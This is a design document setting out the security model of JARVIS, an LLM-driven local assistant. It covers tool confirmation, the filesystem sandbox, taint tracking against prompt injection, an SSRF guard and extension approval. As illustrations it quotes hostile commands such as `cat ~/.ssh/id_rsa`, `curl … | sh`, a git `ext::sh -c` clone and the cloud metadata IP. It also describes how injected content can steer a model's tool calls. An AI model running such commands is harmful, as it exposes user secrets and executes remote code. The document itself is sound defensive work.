# Security Model

> Status: §1 (permission engine + confirmation) implemented in M4.2, with `run_command` added in M4.4; §2 (filesystem sandbox) and §3 (taint) in M4.3; §4's `web_fetch` + SSRF guard in M4.5; §5's manifest, content-keyed approval and loader in M5.1, its in-app approval panel in M5.2, `jarvis install` in M5.3 and the extension host API in M5.4. This document is normative — code that disagrees with it is wrong, and where implementation forced a change the document was amended rather than quietly diverged from (see §1's dialog note and §5's opening).

JARVIS runs shell commands, reads files, and fetches web pages, driven by an LLM that can be manipulated by anything it reads. We treat that as the threat model, not an edge case. We also say plainly what this is: **policy enforcement in a trusted process**, not OS-level sandboxing (no seccomp / sandbox-exec in v1).

## 1. Tool permission model

Every tool has a risk level: `safe` / `ask` / `dangerous`.

- `safe` (e.g. `list_dir`, `send_notification`): runs freely.
- `ask` (e.g. `write_file`, `web_fetch`): confirmation dialog showing the exact action and arguments. The classic illustration of this level is a clipboard read — `get_clipboard` would be `ask` rather than `safe`, because a clipboard holds passwords — but **clipboard is specified, not built: it is cut from v1** (architecture.md), so the shipping `ask` tools are `write_file` and `web_fetch`.
- `dangerous` (e.g. `delete`, anything network-writing): per-call confirmation, globally disableable (`[tools] allow_dangerous` in config.toml; off means refused without even asking).

`run_command` **always confirms, full command text shown, no exceptions.** There is no command classifier and no denylist — both are bypass generators. A future opt-in allowlist may skip confirmation for *exact-match* previously-approved commands only.

### The dialog is in-app, not a native OS dialog (amended M4.2)

This document originally specified a native OS dialog. It is a React modal instead, and the reason is that native would not have bought the property it was there for.

The confirmation originates in the Python backend and the answer returns over the same WebSocket. Driving `tauri-plugin-dialog` from the webview makes the path backend → WS → **webview** → IPC → Rust → OS dialog → **webview** → WS → backend: a compromised webview simply skips the `invoke` and replies "allowed". The webview stays in the trust path either way, so the native dialog is ceremony with real costs — two buttons only (no "allow for this session"), no API to put default focus on Cancel, a zenity/XDG-portal dependency on Linux where a missing dialog fails into deny, no monospace or scrolling for a long command, and undriveable by the headless verification this project relies on. The only variant that genuinely removes the webview is Rust holding its own authenticated socket to the sidecar, which is a second IPC surface that dies in any browser-hosted build.

**What actually carries the security here is identical for both, and is normative:**

- The **backend** mints the correlation id. A confirmation is only ever *requested* by the backend, never *asserted* by a client — there is no message a client can send that approves something out of nowhere.
- Ids are **single-use**. Unknown or already-settled ids are dropped in silence (a second window answering is ordinary traffic, not an error).
- **Absence of an answer is a deny.** No UI connected, every send failed, timeout elapsed, broker raised — all refuse. There is no path where "we couldn't ask" becomes "go ahead".
- The request is **broadcast to every connection**, never the newest one: reloads leave authenticated zombie connections behind, and a stale page must not be able to swallow a confirmation.
- A cancelled generation **dismisses its dialog**. A dialog that outlives the call it asked about is how a user is trained to click Allow without reading.

### "Allow for this session"

Keyed on **tool + exact arguments** (canonical JSON), held in process memory, never written to disk — restarting the backend forgets everything, which is the promise the phrase makes. Approving `git status` therefore does not approve `git status; curl x | sh`. This is the same "exact-match previously-approved" rule stated above for `run_command`.

It is **never honoured for `dangerous`**, which is per-call confirmation and means it. The UI hides the button there, and the backend refuses to record the grant regardless — the button is in a webview and the enforcement is not.

A refusal is also remembered for the rest of the exchange, so a model that re-asks after being told no cannot manufacture a second dialog. That is confirmation fatigue with no attacker in it.

### `run_command`: what it is, and what it is not (M4.4)

Implemented in `backend/jarvis_backend/tools/shell.py`; the lifecycle tests are
`backend/tests/test_shell.py`.

It runs the command **verbatim** through a shell (so pipes, `&&` and redirects
work) and inspects it not at all — the no-classifier, no-denylist rule above is a
property of the code, not just a promise. The dialog is the generic one: the full
command renders in the scrollable monospace argument block, Deny is focused, and
because the tool is `dangerous` there is no "allow for this session" button.

**The shell is not sandboxed, and the docs must not let it seem otherwise.** §2's
filesystem sandbox is a policy check *inside* `read_file`/`write_file`/`delete_file`;
it governs those tools, not the process. `run_command` spawns a subprocess, so
`cat ~/.ssh/id_rsa` — or `curl … | sh`, or anything at all — ignores every root
in §2. **Its only protection is the unconditional confirmation**, and that is why
the confirmation is unconditional. Two consequences are called out so nobody
mistakes a convenience for a boundary:

- **Working directory is the user's home**, and that is a usability default, not
  containment: a shell `cd`s anywhere, so pinning it to a sandbox root would only
  imply a wall that isn't there. Any project is reached by an absolute `cd` inside
  the command the user already sees and approves.
- **The environment is inherited minus the `JARVIS_*` namespace.** The user's
  `PATH`/`HOME`/etc. are kept — a shell that can't find their tools won't get used
  — but the app's own variables are stripped, above all `JARVIS_WS_TOKEN`: the
  WebSocket auth secret must never reach a subprocess. This is hygiene, not a
  sandbox; the user's other secrets stay in the environment, and a command that
  would exfiltrate them is shown in full and confirmed first.

**A non-exiting command cannot hold the app hostage.** There is one generation
slot and no protocol for streaming a command's output, so `run_command` is a
quick-command tool, not a build runner. A 30s timeout (overridable via
`JARVIS_SHELL_TIMEOUT_S` for headless verification; the packaged app never sets
it) and a 64 KB incremental output cap bound the slot and the memory — the cap is
read as the bytes arrive, because `communicate()` would let `yes` or
`cat /dev/urandom` balloon RAM before any timeout fired. On a timeout, a
cancellation (barge-in / stop / delete), or the cap, the **whole process group**
is killed (new session at spawn + `killpg`), so a backgrounded child is never
orphaned.

**Taint still applies.** A command that follows a `read_file` in the same
conversation escalates through the same `PermissionGate`/broker path as any other
side-effectful call, and the dialog names the source — the shell is `dangerous`
already, so what taint adds here is the provenance line, not the confirmation.

### `JARVIS_DEV_TOOLS` (development affordance)

With `JARVIS_DEV_TOOLS=1` the registry gains an `ask`-risk `echo` tool whose body returns its own argument. It exists because the permission engine ships a milestone ahead of the first tool that needs it, and a dialog never seen in the real webview is not a verified dialog. It grants no capability — it is a mirror — and it passes through the full gate like anything else. The packaged app never sets the variable.

## 2. Filesystem sandbox

Filesystem tools operate only under user-configured roots. Enforcement happens on **`Path.resolve()`-ed (symlink-resolved) absolute paths** — checking the path the user typed is not enforcement. Escaping requires explicit per-path user opt-in. The extensions directory and JARVIS's own config/data directories are **permanently outside** all sandbox roots, so no tool can self-escalate by writing an extension or editing permissions.

Implemented in `backend/jarvis_backend/security/sandbox.py`; the escape cases are `backend/tests/test_sandbox.py`.

- **Defaults: Documents, Downloads, Desktop** (`[filesystem] roots` in config.toml, resolved per-OS by platformdirs). Not the whole home directory, so dotfiles, `~/.ssh` and shell history are out of reach on day one. Downloads is included deliberately even though it is where untrusted files land — that is the case §3 exists for, and excluding it would just mean the assistant cannot help with the folder people most want help with.
- **Absent key ⇒ defaults; an explicit `roots = []` ⇒ no file access at all.** The two look alike in a naive lookup and mean opposite things; an empty allowlist that quietly means "allow everything" is a classic and is not ours.
- **Exclusions are checked before roots**, so "inside a configured root" can never override "inside Jarvis's own directories" — which matters because on Linux the config and data dirs legitimately live under the home directory.
- **Deny-side comparisons are casefolded and NFC-normalised; allow-side ones are exact.** `resolve()` settles symlinks and `..`, but not *spelling*: macOS and Windows are case-insensitive, and APFS is normalisation-insensitive as well, so one file has many `Path.parts` spellings. Comparing exactly meant `<root>/Jarvis-Config/config.toml` slipped past the exclusion, matched the root, and reached the real config — the self-escalation this section exists to prevent (fixed M4.3+, `Sandbox._fold`). The asymmetry is deliberate: folding a check whose match means *deny* can only ever refuse more, while folding the **roots** check would hand the sandbox directories the user never configured on a case-sensitive filesystem, where `~/documents` and `~/Documents` are genuinely two places.
- Relative paths are **refused**, never resolved against the process's working directory: the model does not know what that is, so the same argument would name different files on different runs, and one of those would eventually land outside the sandbox.
- Roots are resolved at construction too, because `~/Documents` is a symlink on plenty of real machines (iCloud Drive); comparing an unresolved root against resolved paths would deny everything it is supposed to allow.

## 2a. File tools (M4.3)

`read_file` and `list_dir` are `safe`, `write_file` is `ask`, `delete_file` is `dangerous`. Deleting a **directory** is refused outright rather than approximated: one confirmation cannot honestly represent an unbounded set of files.

Reading is deliberately free of confirmation — it changes nothing, and a prompt per file is the fatigue this document warns about. What carries the security is that a read **taints** (§3). The residual risk is silent reading into context, which matters mainly with a cloud backend; §6's screen warning is the natural place that extends to.

**The roots are named in the tool descriptions (M6.2), and that is discoverability, not permission.** `read_file`, `list_dir` and `write_file` end their descriptions with the configured roots, generated from the live `Sandbox` (`tools/filesystem.py`'s `roots_hint`). Nothing about enforcement changes: `Sandbox.resolve` is untouched and remains the only thing that decides, so a path outside the roots is refused exactly as before whether or not the model was told. It exists because the sandbox was invisible from the model's side in **both** directions — `agent/prompts.py` names no paths (prompt length is TTFT, and hardening that prompt measured *worse*), and a refusal teaches nothing either, since `agent/loop.py` sends the model `result.code` alone on failure, i.e. the bare string `PATH_OUTSIDE_SANDBOX`. So the model guessed, and the guess is unrecoverable exactly where it matters most: **a voice user cannot speak an absolute path.** Two deliberate limits — `delete_file` is left out (a destructive turn should not complete on a guessed path, and being `dangerous` it confirms with the resolved path shown anyway), and `run_command` is left out because it **is not sandboxed at all** (§1), so attaching a sentence about roots to it would be the one placement that states something false.

One consequence for whoever builds the first cloud adapter: the roots are absolute paths, so they carry the user's home directory and therefore their **username**, and the tool schema is sent on every request. Local-only that is nothing — the paths never leave the machine they describe. It becomes a disclosure the moment a backend is remote, and it belongs in the same breath as §6's screen warning rather than being discovered later.

## 3. Taint tracking (prompt-injection defense)

Delimiters around untrusted content are labeling, not defense. The mechanism:

- Content from `web_fetch`, `web_search` results, or files outside a trusted set marks the conversation **tainted**.
- From that point, *every* side-effectful tool call — regardless of its normal risk level — escalates to explicit confirmation, and the dialog says why ("this request follows content from example.com").
- Enforced in the tool-execution layer (`backend/jarvis_backend/security/taint.py`), never in the prompt.

Implemented in M4.3. How it actually works, and the parts worth knowing:

- **A tool declares its own taint.** `read_file` returns a `ToolOutput` carrying the path it read; the agent loop turns that into conversation taint. Nothing downstream can infer "untrusted" from the text itself — which is exactly why prompt-side labeling fails.
- **Conversation-scoped and sticky for the process's life**, in memory, never persisted (same posture as §1's session grants). Sticky across turns on purpose: the raw tool result is *not* replayed to the model in later turns, but the assistant's own prose about it is, so a laundered instruction outlives the exchange that introduced it.
- **A tainted call is never grantable, in both directions.** A session grant given before the untrusted content arrived does not cover a call made after it, and approving a tainted call grants nothing for later. The grant key is only tool+arguments, and an injection reuses exactly those — the taint is the only thing that can tell the two calls apart, so it wins.
- The dialog shows the source path and hides "allow for this session"; the backend refuses to record one regardless, since the button is in a webview and the enforcement is not.
- **The `safe` escalation is live, not vacuous (M5.1).** This section used to record that escalating *safe* side-effectful tools was satisfied vacuously — nothing side-effectful was classified `safe` — and that the fix, when one was needed, was to classify the offender `ask` **or teach the gate a per-tool side-effect flag**. Extensions needed it: an extension may declare a tool `safe` and the core cannot verify the claim (`set_timer` mutates), so `safe` would have skipped the taint check entirely and put a silent hole in this section. The gate now takes `read_only`, fixed at registration and never assertable per call:

  | | clean conversation | tainted conversation |
  |---|---|---|
  | `safe`, `read_only=True` (core: `read_file`, `list_dir`, `get_datetime`) | runs | runs |
  | `safe`, `read_only=False` (**every** extension tool) | runs | **confirms, with provenance** |

  The default is `False` — the fail-safe direction, matching `roots = []` ⇒ deny and a missing model catalog ⇒ tools off. Forgetting the flag costs one confirmation; the opposite default would silently skip this check for a tool nobody vouched for. Untainted extension tools still run freely on purpose: confirming `list_timers` on every call is the fatigue named under "Known limitations", with no attacker in it.

## 4. Network guards

- Backend binds `127.0.0.1` only. WebSocket requires a per-session token *and* a strict `Origin` check (defeats browser drive-bys against localhost).

### What the token actually defends against — the trust boundary, stated (M6.4)

`server/auth.py` used to say the token "blocks" other local processes. **It does not, and the docstring has been corrected.** The token is handed to the sidecar in its environment (`JARVIS_WS_TOKEN`), and an environment is readable by any process running as the same user — `ps eww <pid>` prints it on macOS, `/proc/<pid>/environ` on Linux. Verified on the packaged app, not reasoned about.

The consequence is worth spelling out rather than leaving as an exercise, because it reaches further than "an extra client can connect". Confirmations are **broadcast to every connection and settled by the first answer** (§1, and `confirm.py` says so deliberately — a reload leaves authenticated zombie connections behind, and a stale page must not be able to swallow a dialog). Nothing binds a `confirm.respond` to the connection whose call raised it. So a same-user process holding the token can answer every permission dialog Jarvis raises, including `run_command`'s, before the user's window has drawn it.

**That is inside the trust boundary, and the boundary is the user account.** A process running as you can already read your files and run your shell; routing it through Jarvis grants it nothing it did not have, and the alternative — binding a confirmation to one connection — would break the property §1 actually needs, which is that a reloaded window can still answer.

What follows from saying it plainly:

- **The token is not an authorisation boundary between local processes.** It is a handshake that keeps *unrelated* software from stumbling into the port, and — with the `Origin` check, which a browser cannot forge — it is what stops a web page you have open from driving your assistant. Those are the two things it does.
- **Multi-user machines are covered, single-user ones are not extended.** Another *user* cannot read the environment or the port; another process of *yours* can.
- **This does not weaken §1 for the threat §1 is for.** The permission engine defends against a manipulated *model*, reached through content it reads. It has never claimed to defend against arbitrary code already running as the user, and this section now says so instead of implying otherwise.
- **Not moving the token out of the environment for v1**, and the reason is that it buys very little: handing it over the sidecar's stdin would defeat `ps` and not a debugger, while touching the startup handshake — historically the most fragile part of this app (gotcha 1) — immediately before a release. Recorded as a cheap post-v1 hardening, not a fix, because there is no boundary here to restore.
- **The one thing that would change this** is a same-user process that is *itself* confined — a sandboxed app with no file access — using Jarvis as an unconfined proxy. That is a real escalation shape and it is not closed. It is also not reachable by anything this project ships.

### `web_fetch` and the SSRF guard (M4.5)

Implemented in `backend/jarvis_backend/tools/web.py` (the fetch) and
`backend/jarvis_backend/security/ssrf.py` (the guard); tests are `test_web.py`
and `test_ssrf.py`. `web_fetch` is the tool taint (§3) exists for — its result is
the canonical untrusted content — and the only tool that reaches the network.

- **Risk is `ask`.** Every fetch confirms, showing the URL, because a URL can
  carry data *out* (exfiltration) and that is the defense the SSRF guard cannot
  provide. `safe` is off the table: web egress is a side effect, and §3's
  invariant is that `safe` means read-only. Session grants still apply to an exact
  repeat URL, so re-fetching the same page does not re-ask; a different URL does.
- **Scheme allowlist:** `http`/`https` only. `file://`, `gopher://`, `ftp://` and
  friends are refused before anything is resolved — they are pure SSRF vectors.
- **Resolve, then check every IP.** The host is resolved (an IP-literal host is
  validated directly, never resolved) and refused if **any** address is not
  globally routable. The check uses `ipaddress` classification (private, loopback,
  link-local, multicast, unspecified, reserved), a **superset** of the ranges this
  section used to list by hand (127.0.0.0/8, 10/8, 172.16/12, 192.168/16,
  169.254/16, ::1, fc00::/7): it also covers IPv6, IPv4-mapped addresses
  (`::ffff:127.0.0.1`), and alternate encodings getaddrinfo decodes (decimal
  `2130706433` → `127.0.0.1`). The **any-IP** rule matters — a host with one
  public and one private record must be refused, or it is a trivial bypass.
- **Every redirect hop is re-validated.** A 302 to `http://169.254.169.254/` is
  how an allowed first hop becomes an internal one; redirects are followed by hand
  (capped at 5) so each target passes the same check.
- **Bounded, like the shell:** a 512 KB incremental read cap (a huge body must not
  balloon RAM on the 8 GB target) and a 15 s timeout (env-overridable
  `JARVIS_FETCH_TIMEOUT_S`; a slow server must not hold the single generation
  slot). HTML is reduced to text with the stdlib parser. A non-200 status is shown
  in the result (`[HTTP 404]`), a result the model must see — not a tool failure,
  the same call as shell's exit code.
- **Not a phone-home.** A user-directed, confirmed fetch is a browser action, not
  telemetry; the zero-telemetry principle (§6) is about JARVIS reaching out on its
  own, which this is not, and offline operation is unaffected (the fetch just
  fails).

**Documented residual — DNS rebinding.** There is a TOCTOU window between the
resolve the guard checks and the resolve httpx does at connect time. An attacker
controlling DNS for a host the model was steered to, with a 0-TTL record, could
answer public to the check and private to the socket. The common vectors — direct
internal IPs/hosts, the metadata endpoint, and a redirect to an internal target —
are all closed; closing rebinding needs pinning the connection to the validated
IP while preserving Host/SNI (fragile custom-transport plumbing), deferred for v1.
This is the same posture §2 takes for the file-tool TOCTOU.

## 5. Extensions

Implemented in `backend/jarvis_backend/extensions/` (`manifest.py`, `approvals.py`,
`loader.py`) and surfaced by the in-app panel (`server/app.py`'s `extensions.*`
handlers, `app/src/components/settings/ExtensionsPanel.tsx`); tests are
`test_extensions.py` and `test_install.py`. Approval happens through the panel,
`jarvis extensions approve`, or the prompt at the end of `jarvis install <url>` — three
entry points, one decision.

The panel enforces the same two properties the CLI does, and they are load-bearing:
**approval is two steps, never one** — a list row shows what an extension *is*, and
only a detail card showing its declarations, effective risk levels, digest and the
"runs with the same access" warning offers an Approve button; and **the digest is a
correlation id, not an input** — the client echoes back the digest it was shown, and the
backend re-hashes and refuses (`EXTENSION_CHANGED`) if the bytes changed in between, so
a folder edited while the panel was open cannot be approved unread. Approving loads the
extension immediately (off the event loop) and revoking unregisters exactly the tools it
claimed; neither can un-run code an extension already executed at import, which the panel
states plainly rather than implying a revoke is a full removal.

**Say the true thing first.** An approved extension is `extension.py`, imported into
the sidecar process, running with everything this process can do. A manifest that
declares `network = false` cannot stop `import socket`, and one that declares
`os = []` cannot stop it reading `~/.ssh/id_rsa`. **The `[permissions]` block is a
declaration of intent, not a capability boundary.** Enforcing it for real needs one
subprocess per extension behind an RPC boundary — a different architecture, and an
expensive one on the 8 GB target — so v1 does not claim it. Installing an extension is
informed consent to run someone's code as yourself, and the approval prompt says so in
those words.

What the manifest genuinely buys is the thing nobody gets from reading 500 lines of
source: what this is, who wrote it, which commit, and what it says it needs.

**What IS enforced, and is not negotiable:**

- **Approval is keyed on content, not on a name.** SHA-256 over every file in the
  folder — including `manifest.toml`, so a risk level cannot be lowered after the fact.
  One edited byte and the extension is `changed`: back to unapproved, not loaded.
  Approving `timers` must never mean approving whatever that folder becomes next week.
- **Approval precedes execution.** Discovery reads TOML and hashes bytes; it imports
  nothing. Importing *is* executing — a module body runs on import — so anything that
  had to import an extension to describe it would be asking permission after the fact.
  Only an extension whose current digest matches a recorded approval is ever imported.
  Pinned by `test_an_unapproved_extension_is_never_imported`, which fails if an
  unapproved module body ever runs.
  **This was not quite true until M6.4, and the gap is instructive**: `discover()`
  matched the digest and `_load_one` then imported the *path*, so the decision was
  keyed on content while the import was keyed on a filename. Anything that rewrote
  `extension.py` in the window between them got its bytes executed under an approval
  record attesting to bytes that never ran — and the next startup re-hashed, saw
  `changed`, and refused to load, so the swap ran exactly once and then tidied up
  after itself. Reaching the window needs a process already running as the user
  (inside §4's trust boundary), and it is closed anyway: `_load_one` re-hashes
  immediately before importing. Tripwire:
  `test_bytes_that_changed_after_the_check_are_not_imported`.
- **Nothing can approve itself.** The record is `<data dir>/extensions.toml` and
  extensions live in `<data dir>/extensions`, both permanently outside the §2 sandbox
  (`main.py` excludes the whole data dir). A tool that could write either would install
  or bless its own successor.
- **Risk levels are floors, never ceilings.** The core raises a declared level and
  never lowers it. `network = true` raises the floor to `ask` — the one enforceable
  consequence available for that declaration, since an unconfirmed tool in an
  extension that reaches the network is the exfiltration path. It does nothing about an
  extension that lies; it makes the honest declaration also the enforced one, instead
  of leaving `network` as a field with no behaviour behind it.
- **The manifest is an allowlist.** Only functions named in `[[tools]]` are registered.
  An importable helper is not a tool, and neither is a function added after the user
  read the manifest.
- **No name hijacking.** A tool name already registered — a core tool, or one an
  earlier extension claimed — is refused (`EXTENSION_TOOL_CONFLICT`). `read_file` means
  the sandboxed core tool, and an extension cannot inherit the model's calls to it.
- **Never read-only.** Every extension tool registers with `read_only=False`, so §3's
  taint escalation applies to all of them. See §3 — this is what makes a `safe` tool
  from a third party honest.
- **A broken extension is a result, not a crash.** An import that raises would
  otherwise take the sidecar down at startup, which the user sees only as "backend
  didn't start in time".

### `jarvis install <url>` (M5.3)

`extensions/install.py` **delivers bytes; it does not bless them.** What it clones lands
as `pending` and goes through the same declaration prompt as anything dropped in by hand
— `cli.py`'s `_print_declaration` has one copy and two callers precisely so a second
entry point cannot quietly start showing less.

**It is not a tool and must never become one.** Nothing in it is registered with the
registry. An extension installer the model can reach is arbitrary remote code execution
with a single confirmation in front of it — a different posture from every tool in §1,
and not one this project takes.

What it enforces, in the order it happens:

- **The URL is validated before `git` is invoked.** Only `http`/`https`. This is the
  load-bearing check, not tidiness: `git clone 'ext::sh -c "…"'` **executes that
  command**, because `ext::` is a remote-helper transport. `file://`, `ssh://` and
  scp-style `user@host:path` are refused for the same reason — an extension URL has no
  business being any of them. An allowlist rather than a denylist, because the set of
  transports git supports is not ours to keep up with.
- **Staging is outside the extensions directory**, so a clone in progress can never be
  discovered as a half-written extension, and a failed one leaves nothing behind.
- **The installed name comes from the manifest, never the URL.** A repository that could
  choose its own installed name could install itself over one the user already approved;
  `NAME_RE` already forbids separators and `..`, so traversal is closed by a check that
  predates this.
- **The digest is computed in staging**, so a repo containing a symlink — a digest
  bypass (see above) — is refused before anything is moved into place.
- **The commit is pinned** into the approval record, along with the source URL.
  `provenance()` re-reads both from the installed checkout when approval happens in a
  later command, so a separate `extensions approve` cannot silently blank them, and a
  forced reinstall onto a new commit records the new one rather than keeping a stale
  label. Informational, never authoritative: a folder's `.git` is as editable as the
  rest of it, and nothing consults it when deciding what may run.

### Bundled extensions are seeded, not blessed (M6.0)

`extensions/bundled.py` copies the extensions that ship with the app into the data
directory on startup, because nothing did until M6.0 and `timers-reminders` therefore
did not exist for any real user. It changes nothing in this section, deliberately:

- A seeded extension lands **`pending`**, identical to a folder dropped in by hand, and
  goes through the same declaration prompt. Shipping a default is not consent to run it
  — that consent is the entire subject of this section.
- **Nothing is ever overwritten.** The no-auto-update rule below applies to us as much as
  to a third party: a newer bundled version hashes differently and reads as `changed`
  until a human approves it again.
- Which extensions ship is an **explicit list**, not the contents of a directory, so a
  half-built default cannot reach users by sitting in the repo.

**No extension auto-update, ever** — an extension that can update itself is an extension
whose approved bytes are a suggestion. `--force` replaces the folder and deliberately
leaves any existing approval alone: the new bytes hash differently, so they read as
`changed` and do not load until a human approves them again. Updates need no special
case, because the content-keyed approval already *is* the mechanism.

### The host API (M5.4), and why it changes nothing here

`extensions/host.py` gives an extension two functions — `notify()` and `state_dir()` —
because the tool contract could not express a timer: something has to happen *later*,
with no model call in flight. `timers-reminders` is the first extension to need it.

It is a **convenience, not a boundary, and it does not widen anything**. An approved
extension already runs in this process with everything the process can do; it could
reach the connection list by importing the server module or open its own socket. What
the front door buys is that honest extensions are not coupled to internals that move.
The bounds on it — a global 10/minute rate limit, `data` sanitized to something
`send_json` can encode, `state_dir` names validated — are **reliability** properties:
they stop a badly-written extension taking the sidecar or the WebSocket down with it.
The rate limit is deliberately global rather than per-source, because `source` is a
string the extension chose and nothing verifies it, so a per-source budget would be
evaded by rotating the name.

Notifications carry **codes and data, never sentences**, so §5 inherits the same i18n
rule as everything else: the frontend renders the words, and a code it has never seen
degrades to a neutral line rather than showing the user a raw identifier. `speak=True`
is answered by the UI sending the sentence *it* rendered back as `voice.say`, which is
what keeps English out of the backend; the notification's id makes that single-use so
three open windows do not say the same line three times.

`state_dir()` exists to close a trap rather than to add a capability: an extension
writing beside its own `extension.py` changes the tree digest, so it would silently
un-approve itself the first time it saved anything.

**Residuals, stated rather than hidden:**

- **`__pycache__` is excluded from the digest**, because it is written by importing the
  very files that *are* hashed, and counting it would void every approval on the next
  start. Someone who can write into an already-approved extension's folder could plant
  a hash-based unchecked `.pyc` the digest does not see. That attacker can already edit
  `extension.py` — which the digest *does* see — so this is a detection gap inside a
  folder that is already lost, not a new capability.
- **`sys.path` is deliberately untouched**, so v1 supports a single `extension.py` and
  nothing multi-file. An extension shipping `json.py` would otherwise shadow the
  stdlib for the entire process.
- **A symlink anywhere in the tree refuses the extension** (`EXTENSION_UNSAFE_TREE`).
  Skipping symlinks would be a digest bypass — a symlinked `extension.py` gets imported
  while its real bytes live outside the folder, free to change after approval.

## 5a. Release integrity — what the checksums are for, and what they are not (M6.4)

Every release ships `SHA256SUMS.txt`, generated in CI (`release.yml`'s `publish` job) and never locally. `docs/unsigned-install.md` tells users to verify against it. Both are worth keeping. Neither is a signature, and the difference matters enough to state:

**The checksums travel with the binaries.** They are uploaded to the same GitHub release, by the same job, over the same channel. Anyone able to alter a release asset can alter the checksum file next to it, so `SHA256SUMS.txt` is **not** independent verification of authenticity — it verifies *integrity in transit*, which is a real and different property: a truncated download, a corrupted mirror, or a proxy that mangled the file are all caught. A compromised GitHub account or release is not.

Making it independent needs a signature over the checksums with a key that is not in the release — minisign or GPG, published out of band. That is not a budget problem (both are free), it is a **key-custody** problem: a signing key that lives on the developer's laptop and is never rotated, with no revocation story and no second party, mostly moves the trust rather than adding any. It is recorded here as the honest next step for whoever decides this project's provenance is worth that ceremony.

What actually carries authenticity today is the same thing that carries it for most unsigned open-source software: the release came from a repository the user chose to trust, over TLS, and the source that built it is public. The v1 posture is to say that, not to let a checksum file imply more.

Two related notes so nothing overstates itself:

- **macOS ad-hoc signing is not authentication either.** `Signature=adhoc` means the bundle is internally consistent and its resources are sealed — it says nothing about who built it. What it buys is the difference between *"cannot be verified"* (recoverable with Open Anyway) and *"is damaged"* (not recoverable), which is a usability property. See gotcha 34; every build before M6.2 was the second kind.
- **No auto-update, and this is one of the reasons.** An updater is a channel that fetches and executes code without the user choosing it, and this project has nothing to authenticate that channel with. Auto-update stays blocked on signing rather than shipping unauthenticated.

## 6. Credentials, screen, telemetry

- API keys never appear in prompts, logs, or exports. (Enforced by redaction at the config boundary.)
- `take_screenshot` with a **cloud backend** active warns explicitly: your screen is about to leave this machine. **Neither half of that sentence ships in v1** — the tool is cut (every model inside the 8GB budget is text-only, so there is nothing to send an image to) and no cloud adapter is built. The rule stands as the design for whichever lands first; it is recorded here rather than in a future commit message because the warning is the *reason* the tool would be acceptable at all.
- Telemetry: none. The model catalog is bundled data; refreshing it is a manual, explicit action — no automatic phone-home, ever.

## Known limitations (v1, documented on purpose)

- Same-process policy enforcement: a bug in the backend is a bug in the sandbox.
- TOCTOU windows between path resolution and file operation.
- Confirmation fatigue is a real attack surface; UX must keep confirmations rare enough to be read.
- **The database is not encrypted.** `jarvis.sqlite3` holds every conversation in plain text, readable by any process running as the user. Deleting a conversation removes the rows; it does not shred them, and SQLite may keep the bytes in freed pages until they are reused. This is the same posture as the shell history and browser profile sitting next to it, and full-disk encryption is the mitigation — but it is not implied anywhere in the UI, so it is stated here.
- **The sandbox governs *file tools*, not the process.** It is a policy check inside `read_file`/`write_file`/`delete_file`, so anything that runs code outside them is unaffected. This became load-bearing when `run_command` landed in M4.4: `cat ~/.ssh/id_rsa` ignores every root in this section. Shell's protection is its unconditional confirmation, not the sandbox — see §1's `run_command` subsection, which says so at length.
- **A `safe` tool still reads.** `read_file` needs no confirmation by design (§2a), so a manipulated model can read any file under a root and put its contents in the conversation before anything is shown to the user. Taint makes the *consequences* confirm; it does not un-read the file. With a cloud backend that content has also left the machine.
- **Only macOS has been exercised by hand, and until M6.4 "covered by CI" was false for Windows.** This entry used to say Windows and Linux path handling — drive letters, UNC paths, 8.3 short names, `\\?\` prefixes, per-volume case rules — was "covered by CI's test run and nothing else". CI's backend job ran on `ubuntu-latest` only, so for Windows that resolved to: covered by nothing. The suite now runs on all three (`.github/workflows/ci.yml`), which is as close to Windows hardware as a zero-budget project gets.

  **The first Windows run found a real bug, and it was not a path bug.** Branch alternatives were ordered `created_at, id` — and `id` is a `uuid4`, i.e. random. Windows resolves `datetime.now()` far more coarsely than macOS, so two turns appended back to back share a timestamp and the tie was broken by coin flip: `siblings()` numbered the `‹ 2/3 ›` alternatives arbitrarily and `tip()` could drop the user onto a branch they had never continued — the exact failure `Store.tip()` was added to prevent. Fixed by tie-breaking on SQLite's implicit `rowid` (insertion order, and reachable on databases that already exist, which a new column would not be).

  **What is still unverified on Windows, stated rather than implied:** `run_command`'s bounds. Its tests drive a POSIX shell (`echo nope; exit 3`, `yes`), which under `cmd.exe` tests the harness rather than the tool, so they are skipped there — the 64 KB output cap, the 30 s timeout and the process kill have never been exercised on Windows. `jarvis install`'s git harness also fails there and is not yet diagnosed. Both are v1.x work; neither is claimed as covered here.

  A file tool still has not been driven by hand on either platform.
- **An approved extension is not sandboxed at all.** It runs in the sidecar process with everything that process can do, so its `[permissions]` declarations are advisory. What is enforced is *which bytes* run and *whether* they run — see §5, which leads with this rather than burying it.
- **Revoking an extension removes its tools; it does not unload it.** A thread the extension started keeps running until Jarvis restarts, so a revoked `timers-reminders` still fires the timers it had pending — verified by hand in M5.4, not theorised. The panel says this in as many words rather than implying revoke is a full removal, and suppressing the *symptom* (dropping notifications from unloaded extensions) was deliberately rejected: it would make revoke look complete while the extension is still running, which is a worse lie than the honest caveat. A real fix is the per-extension subprocess that enforcing `[permissions]` would need anyway.
- **`web_fetch` has a DNS-rebinding TOCTOU window.** The SSRF guard checks the IPs it resolves, but httpx resolves again at connect time; a 0-TTL attacker DNS could differ between the two. The direct vectors (internal IPs/hosts, metadata, redirect-to-internal) are closed — see §4 for the full note and why closing rebinding is deferred.
